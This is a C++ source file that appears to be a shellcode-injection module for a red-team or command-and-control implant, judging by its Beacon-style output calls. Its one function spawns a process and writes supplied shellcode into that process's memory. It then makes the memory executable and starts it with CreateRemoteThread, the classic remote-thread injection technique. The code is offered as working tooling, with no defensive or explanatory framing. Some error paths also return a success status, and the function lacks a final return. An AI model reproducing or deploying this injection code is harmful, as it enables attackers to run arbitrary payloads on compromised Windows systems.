#include <general.h>

// this define is mandatory
#define PS_INJECT_KIT

auto SpawnInjection(     
    _In_  PBYTE ShellcodeBuff,
    _In_  ULONG ShellcodeSize,
    _In_  PBYTE InjectArg,
    _In_  PS_CREATE_ARGS* CreateArgs
) -> NTSTATUS {
    NTSTATUS            status       = STATUS_SUCCESS; 
    PROCESS_INFORMATION process_info = { 0 };

    PS_CREATE_ARGS* create_args = CreateArgs;

    status = kh_process_creation( create_args, &process_info );
    if ( ! nt_success( status ) ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Process creation failure with error: (%d) %s", status, fmt_error( status ) );
        return status;
    }

    HANDLE   process_handle  = nullptr;
    LONG     error_code      = ERROR_SUCCESS;

    process_handle = process_info.hProcess;

    BeaconPrintfW( CALLBACK_OUTPUT, L"Spawned process with pid %d and tid %d", process_info.dwProcessId, process_info.dwThreadId );

    PVOID shellcode_ptr = VirtualAllocEx( process_handle, nullptr, ShellcodeSize, MEM_COMMIT, PAGE_READWRITE );
    if ( ! shellcode_ptr ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Allocation memory to shellcode failed with error: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
        return status;
    }

    SIZE_T bytes_written = 0;
    if ( ! WriteProcessMemory( process_handle, shellcode_ptr, ShellcodeBuff, ShellcodeSize, &bytes_written ) ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Write shellcode failed with error: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
        return status;
    }

    ULONG old_protection = 0;
    if ( ! VirtualProtectEx( process_handle, shellcode_ptr, ShellcodeSize, PAGE_EXECUTE_READ, &old_protection ) ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Change protection to RX failed with error: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
        return status;
    }

    ULONG thread_id = 0;
    if ( ! CreateRemoteThread( process_handle, nullptr, 0, (LPTHREAD_START_ROUTINE)shellcode_ptr, nullptr, 0, &thread_id ) ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Create thread to execute shellcode failed with error: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
        return status;
    }
}